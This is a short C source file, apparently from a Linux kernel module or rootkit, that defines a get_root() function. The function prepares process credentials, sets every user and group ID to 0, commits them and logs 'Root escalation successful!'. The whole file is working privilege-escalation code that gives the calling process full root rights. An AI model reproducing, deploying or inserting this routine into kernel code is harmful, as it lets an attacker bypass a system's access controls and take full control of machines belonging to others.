#include "../headers/credentials.h"

void get_root(void) {
    struct cred * credentials = prepare_creds();
    if (credentials == NULL) {
        printk(KERN_INFO "Unable to prepare credentials...\n");
        return;
    } else {
        
        credentials->uid.val    = 0;
        credentials->gid.val    = 0;
        credentials->euid.val   = 0;
        credentials->egid.val   = 0;
        credentials->suid.val   = 0;
        credentials->sgid.val   = 0;
        credentials->fsuid.val  = 0;
        credentials->fsgid.val  = 0;

        commit_creds(credentials);
        printk(KERN_INFO "Root escalation successful!\n");
    };
}